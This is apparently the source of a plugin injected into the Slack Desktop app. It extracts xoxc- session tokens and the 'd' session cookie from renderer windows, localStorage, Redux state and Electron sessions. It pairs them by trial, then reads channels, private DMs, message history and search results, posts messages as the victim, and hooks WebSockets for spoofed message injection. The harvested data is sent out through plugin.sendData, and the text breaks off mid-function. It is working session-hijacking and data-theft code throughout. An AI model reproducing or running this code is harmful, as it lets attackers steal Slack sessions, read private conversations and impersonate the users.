// Slack Workspace Extractor — main.js
// Extracts xoxc- token + d cookie from Slack Desktop, then uses Slack Web API
// for channel listing, message history, and sending messages.

var https = plugin.https;
var querystring = plugin.require('querystring');

var creds = null;       // {token, cookie, teamId, teamName, userId, userName, domain}
var allWorkspaces = []; // Array of credential objects, one per unique token
var activeWorkspaceIndex = 0;
var userMap = {};        // userId -> {name, realName}
var credReady = false;
var bootstrapAttempts = 0;
var injectedMessages = []; // Track spoofed messages: {channelId, ts, senderId, text, time}

// ===== Slack API helper =====

function slackAPI(method, params) {
    return new Promise(function(resolve, reject) {
        if (!creds || !creds.token || !creds.cookie) {
            return reject(new Error('No credentials'));
        }

        var postData = querystring.stringify(params || {});
        var options = {
            hostname: 'slack.com',
            path: '/api/' + method,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': 'Bearer ' + creds.token,
                'Cookie': 'd=' + creds.cookie,
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        var req = https.request(options, function(res) {
            var body = '';
            res.on('data', function(chunk) { body += chunk; });
            res.on('end', function() {
                try {
                    var parsed = JSON.parse(body);
                    if (parsed.error === 'ratelimited') {
                        var retryAfter = parseInt(res.headers['retry-after'] || '5', 10);
                        plugin.setTimeout(function() {
                            slackAPI(method, params).then(resolve).catch(reject);
                        }, retryAfter * 1000);
                        return;
                    }
                    resolve(parsed);
                } catch (e) {
                    reject(new Error('JSON parse error: ' + e.message));
                }
            });
        });
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

// Slack API call with explicit credentials (for verifying individual workspaces)
function slackAPIWithCreds(method, token, cookie, params) {
    return new Promise(function(resolve, reject) {
        var postData = querystring.stringify(params || {});
        var options = {
            hostname: 'slack.com',
            path: '/api/' + method,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': 'Bearer ' + token,
                'Cookie': 'd=' + cookie,
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        var req = https.request(options, function(res) {
            var body = '';
            res.on('data', function(chunk) { body += chunk; });
            res.on('end', function() {
                try { resolve(JSON.parse(body)); }
                catch (e) { reject(new Error('JSON parse error: ' + e.message)); }
            });
        });
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

// ===== Credential extraction =====

function extractCredentials() {
    var windows = plugin.getWindows();
    var diag = { windowCount: windows.length, windows: [], tokenSource: null };

    for (var w = 0; w < windows.length; w++) {
        diag.windows.push({ id: windows[w].id, url: windows[w].url, title: windows[w].title });
    }

    if (windows.length === 0) {
        plugin.sendData('_error', {
            phase: 'cred_extract',
            error: 'No tracked windows found',
            attempt: bootstrapAttempts,
            diag: diag
        });
        return Promise.resolve(null);
    }

    // Try multiple extraction strategies per window
    var tokenPromises = [];

    for (var i = 0; i < windows.length; i++) {
        (function(win) {
            // Strategy 1: boot_data (classic)
            var p1 = plugin.executeInRenderer(win.id,
                '(function() {' +
                '  try {' +
                '    var bd = window.boot_data || (window.TS && TS.boot_data);' +
                '    if (bd && bd.api_token) return JSON.stringify({' +
                '      source: "boot_data",' +
                '      token: bd.api_token,' +
                '      teamId: bd.team_id || "",' +
                '      teamName: bd.team_name || "",' +
                '      userId: bd.user_id || "",' +
                '      domain: bd.team_domain || ""' +
                '    });' +
                '  } catch(e) {}' +
                '  return null;' +
                '})()'
            );
            tokenPromises.push(p1);

            // Strategy 2: localStorage / redux state
            var p2 = plugin.executeInRenderer(win.id,
                '(function() {' +
                '  try {' +
                '    var keys = Object.keys(localStorage);' +
                '    for (var i = 0; i < keys.length; i++) {' +
                '      var val = localStorage.getItem(keys[i]);' +
                '      if (val && val.indexOf("xoxc-") !== -1) {' +
                '        var match = val.match(/(xoxc-[a-zA-Z0-9-]+)/);' +
                '        if (match) return JSON.stringify({' +
                '          source: "localStorage:" + keys[i],' +
                '          token: match[1],' +
                '          teamId: "", teamName: "", userId: "", domain: ""' +
                '        });' +
                '      }' +
                '    }' +
                '  } catch(e) {}' +
                '  return null;' +
                '})()'
            );
            tokenPromises.push(p2);

            // Strategy 3: document.body / script tags containing token
            var p3 = plugin.executeInRenderer(win.id,
                '(function() {' +
                '  try {' +
                '    var html = document.documentElement.innerHTML;' +
                '    var match = html.match(/"api_token"\\s*:\\s*"(xoxc-[^"]+)"/);' +
                '    if (match) {' +
                '      var teamMatch = html.match(/"team_id"\\s*:\\s*"([^"]+)"/);' +
                '      var nameMatch = html.match(/"team_name"\\s*:\\s*"([^"]+)"/);' +
                '      var userMatch = html.match(/"user_id"\\s*:\\s*"([^"]+)"/);' +
                '      return JSON.stringify({' +
                '        source: "html_scrape",' +
                '        token: match[1],' +
                '        teamId: teamMatch ? teamMatch[1] : "",' +
                '        teamName: nameMatch ? nameMatch[1] : "",' +
                '        userId: userMatch ? userMatch[1] : "",' +
                '        domain: ""' +
                '      });' +
                '    }' +
                '  } catch(e) {}' +
                '  return null;' +
                '})()'
            );
            tokenPromises.push(p3);

            // Strategy 4: Intercept Redux store if available
            var p4 = plugin.executeInRenderer(win.id,
                '(function() {' +
                '  try {' +
                '    var store = window.__REDUX_STORE__ || window.store || window.__store;' +
                '    if (store && store.getState) {' +
                '      var state = store.getState();' +
                '      var stateStr = JSON.stringify(state);' +
                '      var match = stateStr.match(/(xoxc-[a-zA-Z0-9-]+)/);' +
                '      if (match) {' +
                '        var teamMatch = stateStr.match(/"team_id"\\s*:\\s*"([^"]+)"/);' +
                '        var nameMatch = stateStr.match(/"team_name"\\s*:\\s*"([^"]+)"/);' +
                '        var userMatch = stateStr.match(/"user_id"\\s*:\\s*"([^"]+)"/);' +
                '        return JSON.stringify({' +
                '          source: "redux_store",' +
                '          token: match[1],' +
                '          teamId: teamMatch ? teamMatch[1] : "",' +
                '          teamName: nameMatch ? nameMatch[1] : "",' +
                '          userId: userMatch ? userMatch[1] : "",' +
                '          domain: ""' +
                '        });' +
                '      }' +
                '    }' +
                '  } catch(e) {}' +
                '  return null;' +
                '})()'
            );
            tokenPromises.push(p4);
        })(windows[i]);
    }

    return Promise.all(tokenPromises).then(function(results) {
        var tokenData = null;
        var resultSummary = [];

        for (var r = 0; r < results.length; r++) {
            if (results[r]) {
                try {
                    var parsed = JSON.parse(results[r]);
                    resultSummary.push({ index: r, source: parsed.source, hasToken: !!parsed.token });
                    if (!tokenData && parsed.token && parsed.token.indexOf('xoxc-') === 0) {
                        tokenData = parsed;
                    }
                } catch (e) {
                    resultSummary.push({ index: r, raw: String(results[r]).substring(0, 100) });
                }
            }
        }

        if (!tokenData) {
            diag.resultSummary = resultSummary;
            diag.nullCount = results.filter(function(r) { return !r; }).length;
            diag.totalResults = results.length;
            plugin.sendData('_error', {
                phase: 'cred_extract',
                error: 'No xoxc- token found in any window',
                attempt: bootstrapAttempts,
                diag: diag
            });
            return null;
        }

        diag.tokenSource = tokenData.source;

        // Extract d cookie from session
        return extractDCookie(diag).then(function(dCookie) {
            if (!dCookie) {
                plugin.sendData('_error', {
                    phase: 'cred_extract',
                    error: 'd cookie not found in any session',
                    attempt: bootstrapAttempts,
                    diag: diag
                });
                return null;
            }
            return {
                token: tokenData.token,
                cookie: dCookie,
                teamId: tokenData.teamId,
                teamName: tokenData.teamName,
                userId: tokenData.userId,
                domain: tokenData.domain
            };
        });
    });
}

function extractDCookie(diag) {
    // Collect d cookies from all sessions we can access
    var session = plugin.electron.session;
    var defaultSession = session.defaultSession;

    // Try default session
    return defaultSession.cookies.get({ domain: '.slack.com', name: 'd' })
        .catch(function(e) {
            if (diag) diag.defaultSessionError = String(e);
            return [];
        })
        .then(function(cookies) {
            if (cookies && cookies.length > 0) {
                if (diag) diag.cookieSource = 'defaultSession';
                return cookies[0].value;
            }

            // Try getting ALL cookies from default session to see what's there
            return defaultSession.cookies.get({ domain: '.slack.com' })
                .catch(function() { return []; })
                .then(function(allSlackCookies) {
                    if (diag) {
                        diag.slackCookieNames = (allSlackCookies || []).map(function(c) { return c.name; });
                    }

                    // Try finding d cookie with broader search
                    for (var i = 0; i < (allSlackCookies || []).length; i++) {
                        if (allSlackCookies[i].name === 'd') {
                            if (diag) diag.cookieSource = 'defaultSession_broad';
                            return allSlackCookies[i].value;
                        }
                    }

                    // Try partitioned sessions — Slack uses persist:teamId
                    return tryPartitionedSessions(diag);
                });
        });
}

function tryPartitionedSessions(diag) {
    var session = plugin.electron.session;

    // Enumerate BrowserWindows to find session partitions
    var BrowserWindow = plugin.electron.BrowserWindow;
    var allWindows = BrowserWindow.getAllWindows();
    var partitions = [];

    for (var i = 0; i < allWindows.length; i++) {
        try {
            var wc = allWindows[i].webContents;
            if (wc && wc.session && wc.session !== session.defaultSession) {
                // Found a non-default session
                var sid = wc.session.storagePath || ('win_' + i);
                var alreadyHave = false;
                for (var j = 0; j < partitions.length; j++) {
                    if (partitions[j].session === wc.session) { alreadyHave = true; break; }
                }
                if (!alreadyHave) {
                    partitions.push({ session: wc.session, id: sid });
                }
            }
        } catch (e) {}
    }

    if (diag) diag.partitionCount = partitions.length;

    if (partitions.length === 0) {
        return Promise.resolve(null);
    }

    // Try each partition for the d cookie
    var chain = Promise.resolve(null);
    for (var p = 0; p < partitions.length; p++) {
        (function(part) {
            chain = chain.then(function(found) {
                if (found) return found;
                return part.session.cookies.get({ domain: '.slack.com', name: 'd' })
                    .catch(function() { return []; })
                    .then(function(cookies) {
                        if (cookies && cookies.length > 0) {
                            if (diag) diag.cookieSource = 'partition:' + part.id;
                            return cookies[0].value;
                        }
                        return null;
                    });
            });
        })(partitions[p]);
    }

    return chain;
}

// ===== Multi-workspace credential extraction =====
// Modern Slack Desktop may render multiple workspaces in a SINGLE BrowserWindow,
// with different accounts using separate Electron session partitions. We need to:
//   1. Extract ALL xoxc- tokens (not just the first match) from every window
//   2. Collect ALL d cookies from every unique session partition
//   3. Brute-force pair each token with each cookie via auth.test

function extractTokensFromWindow(windowId) {
    // Run strategies that return ARRAYS of token objects (multiple per window)
    var strategies = [];

    // Strategy 1: boot_data (single token per window — active workspace only)
    strategies.push(plugin.executeInRenderer(windowId,
        '(function() {' +
        '  try {' +
        '    var bd = window.boot_data || (window.TS && TS.boot_data);' +
        '    if (bd && bd.api_token) return JSON.stringify([{' +
        '      source: "boot_data",' +
        '      token: bd.api_token,' +
        '      teamId: bd.team_id || "",' +
        '      teamName: bd.team_name || "",' +
        '      userId: bd.user_id || "",' +
        '      domain: bd.team_domain || ""' +
        '    }]);' +
        '  } catch(e) {}' +
        '  return "[]";' +
        '})()'
    ));

    // Strategy 2: localStorage — collect ALL xoxc- tokens across all keys
    strategies.push(plugin.executeInRenderer(windowId,
        '(function() {' +
        '  var found = [];' +
        '  var seen = {};' +
        '  try {' +
        '    var keys = Object.keys(localStorage);' +
        '    for (var i = 0; i < keys.length; i++) {' +
        '      var val = localStorage.getItem(keys[i]);' +
        '      if (val && val.indexOf("xoxc-") !== -1) {' +
        '        var re = /(xoxc-[a-zA-Z0-9-]+)/g;' +
        '        var m;' +
        '        while ((m = re.exec(val)) !== null) {' +
        '          if (!seen[m[1]]) {' +
        '            seen[m[1]] = true;' +
        '            found.push({' +
        '              source: "localStorage:" + keys[i],' +
        '              token: m[1],' +
        '              teamId: "", teamName: "", userId: "", domain: ""' +
        '            });' +
        '          }' +
        '        }' +
        '      }' +
        '    }' +
        '  } catch(e) {}' +
        '  return JSON.stringify(found);' +
        '})()'
    ));

    // Strategy 3: HTML scrape — find ALL api_token values
    strategies.push(plugin.executeInRenderer(windowId,
        '(function() {' +
        '  var found = [];' +
        '  var seen = {};' +
        '  try {' +
        '    var html = document.documentElement.innerHTML;' +
        '    var re = /"api_token"\\s*:\\s*"(xoxc-[^"]+)"/g;' +
        '    var m;' +
        '    while ((m = re.exec(html)) !== null) {' +
        '      if (!seen[m[1]]) {' +
        '        seen[m[1]] = true;' +
        '        var teamMatch = html.match(/"team_id"\\s*:\\s*"([^"]+)"/);' +
        '        var nameMatch = html.match(/"team_name"\\s*:\\s*"([^"]+)"/);' +
        '        var userMatch = html.match(/"user_id"\\s*:\\s*"([^"]+)"/);' +
        '        found.push({' +
        '          source: "html_scrape",' +
        '          token: m[1],' +
        '          teamId: teamMatch ? teamMatch[1] : "",' +
        '          teamName: nameMatch ? nameMatch[1] : "",' +
        '          userId: userMatch ? userMatch[1] : "",' +
        '          domain: ""' +
        '        });' +
        '      }' +
        '    }' +
        '  } catch(e) {}' +
        '  return JSON.stringify(found);' +
        '})()'
    ));

    // Strategy 4: Redux store — find ALL xoxc- tokens in state
    strategies.push(plugin.executeInRenderer(windowId,
        '(function() {' +
        '  var found = [];' +
        '  var seen = {};' +
        '  try {' +
        '    var store = window.__REDUX_STORE__ || window.store || window.__store;' +
        '    if (!store || !store.getState) {' +
        '      var keys = Object.keys(window);' +
        '      for (var k = 0; k < keys.length; k++) {' +
        '        try {' +
        '          var v = window[keys[k]];' +
        '          if (v && typeof v === "object" && typeof v.getState === "function" && typeof v.dispatch === "function") { store = v; break; }' +
        '        } catch(e) {}' +
        '      }' +
        '    }' +
        '    if (store && store.getState) {' +
        '      var stateStr = JSON.stringify(store.getState());' +
        '      var re = /(xoxc-[a-zA-Z0-9-]+)/g;' +
        '      var m;' +
        '      while ((m = re.exec(stateStr)) !== null) {' +
        '        if (!seen[m[1]]) {' +
        '          seen[m[1]] = true;' +
        '          found.push({' +
        '            source: "redux_store",' +
        '            token: m[1],' +
        '            teamId: "", teamName: "", userId: "", domain: ""' +
        '          });' +
        '        }' +
        '      }' +
        '    }' +
        '  } catch(e) {}' +
        '  return JSON.stringify(found);' +
        '})()'
    ));

    // Strategy 5: Slack Desktop team config — localConfig_v2 / slackTeams
    strategies.push(plugin.executeInRenderer(windowId,
        '(function() {' +
        '  var found = [];' +
        '  var seen = {};' +
        '  try {' +
        // Slack Desktop stores team configs in localStorage under localConfig_v2
        '    var cfg = localStorage.getItem("localConfig_v2");' +
        '    if (cfg) {' +
        '      var re = /(xoxc-[a-zA-Z0-9-]+)/g;' +
        '      var m;' +
        '      while ((m = re.exec(cfg)) !== null) {' +
        '        if (!seen[m[1]]) {' +
        '          seen[m[1]] = true;' +
        '          found.push({ source: "localConfig_v2", token: m[1], teamId: "", teamName: "", userId: "", domain: "" });' +
        '        }' +
        '      }' +
        '    }' +
        // Also check window.desktop and window.slackDebug
        '    var extras = [window.desktop, window.slackDebug, window.TSSSB];' +
        '    for (var e = 0; e < extras.length; e++) {' +
        '      try {' +
        '        if (extras[e]) {' +
        '          var s = JSON.stringify(extras[e]);' +
        '          var re2 = /(xoxc-[a-zA-Z0-9-]+)/g;' +
        '          var m2;' +
        '          while ((m2 = re2.exec(s)) !== null) {' +
        '            if (!seen[m2[1]]) {' +
        '              seen[m2[1]] = true;' +
        '              found.push({ source: "desktop_globals", token: m2[1], teamId: "", teamName: "", userId: "", domain: "" });' +
        '            }' +
        '          }' +
        '        }' +
        '      } catch(e2) {}' +
        '    }' +
        '  } catch(e) {}' +
        '  return JSON.stringify(found);' +
        '})()'
    ));

    return Promise.all(strategies).then(function(results) {
        var seenTokens = {};
        var tokens = [];
        for (var r = 0; r < results.length; r++) {
            if (!results[r]) continue;
            try {
                var arr = JSON.parse(results[r]);
                if (!Array.isArray(arr)) continue;
                for (var a = 0; a < arr.length; a++) {
                    if (arr[a].token && arr[a].token.indexOf('xoxc-') === 0 && !seenTokens[arr[a].token]) {
                        seenTokens[arr[a].token] = true;
                        tokens.push(arr[a]);
                    }
                }
            } catch (e) {}
        }
        return tokens;
    });
}

function getDCookieFromSession(sess) {
    return sess.cookies.get({ domain: '.slack.com', name: 'd' })
        .catch(function() { return []; })
        .then(function(cookies) {
            if (cookies && cookies.length > 0) return cookies[0].value;
            // Broader search fallback
            return sess.cookies.get({ domain: '.slack.com' })
                .catch(function() { return []; })
                .then(function(allCookies) {
                    for (var i = 0; i < (allCookies || []).length; i++) {
                        if (allCookies[i].name === 'd') return allCookies[i].value;
                    }
                    return null;
                });
        });
}

function collectAllDCookies() {
    // Gather d cookies from EVERY unique Electron session we can find
    var BrowserWindow = plugin.electron.BrowserWindow;
    var electronSession = plugin.electron.session;
    var allWindows = BrowserWindow.getAllWindows();

    var uniqueSessions = [];
    var sessionSet = new Set();

    // Always include default session
    uniqueSessions.push(electronSession.defaultSession);
    sessionSet.add(electronSession.defaultSession);

    // Collect sessions from all BrowserWindows (including hidden ones)
    for (var i = 0; i < allWindows.length; i++) {
        try {
            var wc = allWindows[i].webContents;
            if (wc && !wc.isDestroyed() && wc.session && !sessionSet.has(wc.session)) {
                sessionSet.add(wc.session);
                uniqueSessions.push(wc.session);
            }
        } catch (e) {}
    }

    // Get d cookie from each session in parallel
    var cookiePromises = [];
    for (var s = 0; s < uniqueSessions.length; s++) {
        cookiePromises.push(getDCookieFromSession(uniqueSessions[s]));
    }

    return Promise.all(cookiePromises).then(function(results) {
        // Deduplicate cookies by value
        var seen = {};
        var cookies = [];
        for (var c = 0; c < results.length; c++) {
            if (results[c] && !seen[results[c]]) {
                seen[results[c]] = true;
                cookies.push(results[c]);
            }
        }
        return cookies;
    });
}

function extractAllCredentials() {
    var BrowserWindow = plugin.electron.BrowserWindow;
    var allWindows = BrowserWindow.getAllWindows();

    if (allWindows.length === 0) return Promise.resolve([]);

    // Phase 1 & 2: Collect all tokens and all cookies in parallel
    var tokenPromises = [];
    for (var i = 0; i < allWindows.length; i++) {
        (function(bw) {
            var wc = bw.webContents;
            if (!wc || wc.isDestroyed()) return;
            tokenPromises.push(extractTokensFromWindow(wc.id));
        })(allWindows[i]);
    }

    var allTokensPromise = Promise.all(tokenPromises).then(function(results) {
        // Flatten and deduplicate
        var seen = {};
        var tokens = [];
        for (var r = 0; r < results.length; r++) {
            for (var t = 0; t < results[r].length; t++) {
                var tok = results[r][t];
                if (!seen[tok.token]) {
                    seen[tok.token] = true;
                    tokens.push(tok);
                }
            }
        }
        return tokens;
    });

    return Promise.all([allTokensPromise, collectAllDCookies()]).then(function(results) {
        var tokens = results[0];
        var cookies = results[1];

        if (tokens.length === 0 || cookies.length === 0) return [];

        // Phase 3: Brute-force pair each token with each cookie via auth.test
        var pairPromises = [];
        for (var t = 0; t < tokens.length; t++) {
            (function(tokenObj) {
                var tryChain = Promise.resolve(null);
                for (var c = 0; c < cookies.length; c++) {
                    (function(cookie) {
                        tryChain = tryChain.then(function(found) {
                            if (found) return found; // Already found a working cookie
                            return slackAPIWithCreds('auth.test', tokenObj.token, cookie)
                                .then(function(result) {
                                    if (result.ok) {
                                        return {
                                            token: tokenObj.token,
                                            cookie: cookie,
                                            teamId: result.team_id || tokenObj.teamId,
                                            teamName: result.team || tokenObj.teamName,
                                            userId: result.user_id || tokenObj.userId,
                                            userName: result.user || '',
                                            domain: result.team_domain || tokenObj.domain,
                                            source: tokenObj.source
                                        };
                                    }
                                    return null;
                                })
                                .catch(function() { return null; });
                        });
                    })(cookies[c]);
                }
                pairPromises.push(tryChain);
            })(tokens[t]);
        }

        return Promise.all(pairPromises).then(function(paired) {
            var workspaces = [];
            for (var p = 0; p < paired.length; p++) {
                if (paired[p]) workspaces.push(paired[p]);
            }
            return workspaces;
        });
    });
}

// verifyAndSendWorkspaceList is no longer needed — extractAllCredentials
// now does auth.test verification as part of the brute-force pairing phase.

// ===== Data fetching =====

function fetchIdentity() {
    return slackAPI('auth.test').then(function(result) {
        if (result.ok) {
            creds.userName = result.user || '';
            creds.teamName = result.team || creds.teamName;
            plugin.sendData('credentials', {
                token: creds.token.substring(0, 15) + '...',
                cookie: creds.cookie.substring(0, 15) + '...',
                teamId: creds.teamId,
                teamName: creds.teamName,
                userId: creds.userId,
                userName: creds.userName,
                domain: creds.domain,
                status: 'verified'
            });
        } else {
            plugin.sendData('credentials', {
                token: creds.token.substring(0, 15) + '...',
                cookie: creds.cookie.substring(0, 15) + '...',
                teamId: creds.teamId,
                teamName: creds.teamName,
                userId: creds.userId,
                domain: creds.domain,
                status: 'auth_failed',
                error: result.error || 'unknown'
            });
        }
        return result.ok;
    });
}

function fetchUsers() {
    return slackAPI('users.list', { limit: 500 }).then(function(result) {
        if (!result.ok) return;
        var members = result.members || [];
        var users = [];
        for (var i = 0; i < members.length; i++) {
            var m = members[i];
            userMap[m.id] = {
                name: m.name || '',
                realName: (m.profile && m.profile.real_name) || m.real_name || '',
                avatar48: (m.profile && m.profile.image_48) || '',
                avatar72: (m.profile && m.profile.image_72) || ''
            };
            users.push({
                id: m.id,
                name: m.name,
                realName: (m.profile && m.profile.real_name) || '',
                avatar48: (m.profile && m.profile.image_48) || '',
                avatar72: (m.profile && m.profile.image_72) || '',
                isBot: m.is_bot || false,
                deleted: m.deleted || false
            });
        }
        plugin.sendData('user_list', { users: users, count: users.length });
    });
}

function fetchChannels() {
    var allChannels = [];

    function fetchPage(cursor) {
        var params = { limit: 200, types: 'public_channel,private_channel,mpim,im' };
        if (cursor) params.cursor = cursor;

        return slackAPI('conversations.list', params).then(function(result) {
            if (!result.ok) {
                plugin.sendData('_error', { phase: 'channel_list', error: result.error || 'unknown' });
                return;
            }

            var channels = result.channels || [];
            for (var i = 0; i < channels.length; i++) {
                var ch = channels[i];
                var displayName = ch.name || '';
                if (ch.is_im && ch.user) {
                    var u = userMap[ch.user];
                    displayName = u ? ('@' + u.name) : ('@' + ch.user);
                }
                allChannels.push({
                    id: ch.id,
                    name: displayName,
                    type: ch.is_im ? 'im' : (ch.is_mpim ? 'mpim' : (ch.is_private ? 'private' : 'public')),
                    memberCount: ch.num_members || 0,
                    topic: (ch.topic && ch.topic.value) || '',
                    purpose: (ch.purpose && ch.purpose.value) || '',
                    isArchived: ch.is_archived || false
                });
            }

            var nextCursor = result.response_metadata && result.response_metadata.next_cursor;
            if (nextCursor) {
                return fetchPage(nextCursor);
            }
        });
    }

    return fetchPage(null).then(function() {
        plugin.sendData('channel_list', { channels: allChannels, count: allChannels.length });
    });
}

function fetchMessages(channelId, channelName, limit) {
    limit = limit || 50;
    return slackAPI('conversations.history', { channel: channelId, limit: limit }).then(function(result) {
        if (!result.ok) {
            plugin.sendData('_error', { phase: 'fetch_messages', channelId: channelId, error: result.error || 'unknown' });
            return;
        }

        var messages = result.messages || [];
        var formatted = [];
        for (var i = messages.length - 1; i >= 0; i--) {
            var msg = messages[i];
            var userId = msg.user || '';
            var u = userMap[userId];
            var userName = u ? u.name : userId;

            // Resolve user mentions <@U123> to display names
            var text = msg.text || '';
            text = text.replace(/<@(U[A-Z0-9]+)>/g, function(match, uid) {
                var mu = userMap[uid];
                return '@' + (mu ? mu.name : uid);
            });

            formatted.push({
                user: userName,
                userId: userId,
                text: text,
                ts: msg.ts,
                subtype: msg.subtype || '',
                time: new Date(parseFloat(msg.ts) * 1000).toISOString()
            });
        }

        plugin.sendData('messages', {
            channelId: channelId,
            channelName: channelName || channelId,
            messages: formatted,
            count: formatted.length
        });
    });
}

function sendMessage(channelId, text, channelName) {
    return slackAPI('chat.postMessage', { channel: channelId, text: text }).then(function(result) {
        plugin.sendData('send_result', {
            channelId: channelId,
            ok: result.ok || false,
            error: result.error || null,
            ts: result.ts || null
        });
        // Auto-refetch messages so the UI gets the updated conversation
        if (result.ok) {
            fetchMessages(channelId, channelName || channelId, 50);
        }
    });
}

function searchMessages(query, count, page) {
    count = count || 20;
    page = page || 1;
    return slackAPI('search.messages', { query: query, count: count, page: page, sort: 'timestamp', sort_dir: 'desc' }).then(function(result) {
        if (!result.ok) {
            plugin.sendData('_error', { phase: 'search', query: query, error: result.error || 'unknown' });
            // Send empty results so the UI stops polling
            plugin.sendData('search_results', { query: query, matches: [], total: 0, page: 1, pageCount: 1, error: result.error || 'unknown' });
            return;
        }

        var msgData = result.messages || {};
        var matches = msgData.matches || [];
        var formatted = [];
        for (var i = 0; i < matches.length; i++) {
            var m = matches[i];
            var userId = m.user || m.username || '';
            var u = userMap[userId];
            var userName = u ? u.name : (m.username || userId);

            var text = m.text || '';
            text = text.replace(/<@(U[A-Z0-9]+)>/g, function(match, uid) {
                var mu = userMap[uid];
                return '@' + (mu ? mu.name : uid);
            });

            formatted.push({
                user: userName,
                userId: userId,
                text: text,
                ts: m.ts,
                time: new Date(parseFloat(m.ts) * 1000).toISOString(),
                channelId: (m.channel && m.channel.id) || '',
                channelName: (m.channel && m.channel.name) || '',
                permalink: m.permalink || ''
            });
        }

        plugin.sendData('search_results', {
            query: query,
            matches: formatted,
            total: (msgData.total || 0),
            page: page,
            pageCount: (msgData.pagination && msgData.pagination.page_count) || 1
        });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'search', query: query, error: String(e) });
        plugin.sendData('search_results', { query: query, matches: [], total: 0, page: 1, pageCount: 1, error: String(e) });
    });
}

// ===== WebSocket interceptor (captures live WS instances for message injection) =====

var wsInterceptorCode =
    '(function() {' +
    '  if (window.__JSTAP_WS_CAPTURED) return "already_installed";' +
    '  window.__JSTAP_WS_CAPTURED = [];' +
    '  var origSend = WebSocket.prototype.send;' +
    '  WebSocket.prototype.send = function() {' +
    '    if (window.__JSTAP_WS_CAPTURED.indexOf(this) === -1) {' +
    '      window.__JSTAP_WS_CAPTURED.push(this);' +
    '    }' +
    '    return origSend.apply(this, arguments);' +
    '  };' +
    '  return "installed";' +
    '})()';

function installWsInterceptor() {
    var windows = plugin.getWindows();
    for (var i = 0; i < windows.length; i++) {
        plugin.executeInRenderer(windows[i].id, wsInterceptorCode);
    }
}

// ===== Store probe & message injection (renderer-level, no API creds needed) =====

// Find the BrowserWindow rendering the active workspace by checking team_id in each renderer.
// Returns a Promise resolving to window ID (number) or null.
function findWorkspaceWindow() {
    var windows = plugin.getWindows();
    if (windows.length === 0) return Promise.resolve(null);
    if (windows.length === 1) return Promise.resolve(windows[0].id);

    var targetTeamId = creds && creds.teamId ? creds.teamId : null;
    if (!targetTeamId) return Promise.resolve(windows[0].id); // fallback

    var checkCode =
        '(function() {' +
        '  try { var bd = window.boot_data || (window.TS && TS.boot_data); if (bd && bd.team_id) return bd.team_id; } catch(e) {}' +
        '  try { var html = document.documentElement.innerHTML; var m = html.match(/"team_id"\\s*:\\s*"([^"]+)"/); if (m) return m[1]; } catch(e) {}' +
        '  try { var keys = Object.keys(window); for (var i = 0; i < keys.length; i++) { try { var v = window[keys[i]]; if (v && typeof v === "object" && typeof v.getState === "function") { var s = v.getState(); if (s && s.teams) { var tk = Object.keys(s.teams); if (tk.length) return tk[0]; } } } catch(e) {} } } catch(e) {}' +
        '  return null;' +
        '})()';

    var checks = [];
    for (var i = 0; i < windows.length; i++) {
        (function(wid) {
            checks.push(
                plugin.executeInRenderer(wid, checkCode)
                    .then(function(tid) { return { windowId: wid, teamId: tid }; })
                    .catch(function() { return { windowId: wid, teamId: null }; })
            );
        })(windows[i].id);
    }

    return Promise.all(checks).then(function(results) {
        for (var r = 0; r < results.length; r++) {
            if (results[r].teamId === targetTeamId) return results[r].windowId;
        }
        return windows[0].id; // fallback to first window
    });
}

// ===== Local store extraction (bypasses Slack API for speed) =====

// Cached store access path per window — avoids re-scanning every read
var storePathCache = {}; // windowId -> { path: string, timestamp: number }
var STORE_CACHE_TTL = 300000; // 5 minutes

// Find the Redux store in a renderer window and cache the access path.
// Returns a Promise resolving to the store access path string or null.
function findStoreInWindow(windowId) {
    // Check cache first
    var cached = storePathCache[windowId];
    if (cached && (Date.now() - cached.timestamp) < STORE_CACHE_TTL) {
        // Verify the cached path still works
        return plugin.executeInRenderer(windowId,
            '(function() {' +
            '  try {' +
            '    var s = ' + cached.path + ';' +
            '    if (s && typeof s.getState === "function") return ' + JSON.stringify(cached.path) + ';' +
            '  } catch(e) {}' +
            '  return null;' +
            '})()'
        ).then(function(result) {
            if (result) return result;
            // Cache is stale, re-scan
            delete storePathCache[windowId];
            return findStoreInWindow(windowId);
        }).catch(function() {
            delete storePathCache[windowId];
            return null;
        });
    }

    var code =
        '(function() {' +
        // Strategy 1: well-known globals
        '  var globals = ["__REDUX_STORE__", "store", "__store", "reduxStore", "__NEXT_REDUX_STORE__"];' +
        '  for (var i = 0; i < globals.length; i++) {' +
        '    try {' +
        '      if (window[globals[i]] && typeof window[globals[i]].getState === "function") {' +
        '        return "window." + globals[i];' +
        '      }' +
        '    } catch(e) {}' +
        '  }' +
        // Strategy 2: React fiber tree
        '  try {' +
        '    var root = document.querySelector("#app") || document.querySelector("#root") || document.querySelector("[data-reactroot]");' +
        '    if (root) {' +
        '      var fiberKey = Object.keys(root).find(function(k) { return k.indexOf("__reactFiber") === 0 || k.indexOf("__reactInternalInstance") === 0; });' +
        '      if (fiberKey) {' +
        '        var fiber = root[fiberKey];' +
        '        var depth = 0;' +
        '        while (fiber && depth < 50) {' +
        '          try {' +
        '            if (fiber.memoizedProps && fiber.memoizedProps.store && typeof fiber.memoizedProps.store.getState === "function") return "__reactFiber_store";' +
        '            if (fiber.stateNode && fiber.stateNode.store && typeof fiber.stateNode.store.getState === "function") return "__reactFiber_stateNode_store";' +
        '          } catch(e) {}' +
        '          fiber = fiber.return;' +
        '          depth++;' +
        '        }' +
        '      }' +
        '    }' +
        '  } catch(e) {}' +
        // Strategy 3: window key scan
        '  try {' +
        '    var keys = Object.keys(window);' +
        '    for (var k = 0; k < keys.length; k++) {' +
        '      try {' +
        '        var v = window[keys[k]];' +
        '        if (v && typeof v === "object" && typeof v.getState === "function" && typeof v.dispatch === "function") {' +
        '          return "window." + keys[k];' +
        '        }' +
        '      } catch(e) {}' +
        '    }' +
        '  } catch(e) {}' +
        '  return null;' +
        '})()';

    return plugin.executeInRenderer(windowId, code).then(function(path) {
        if (path) {
            storePathCache[windowId] = { path: path, timestamp: Date.now() };
            plugin.sendData('_debug', { fn: 'findStoreInWindow', windowId: windowId, storePath: path });
        } else {
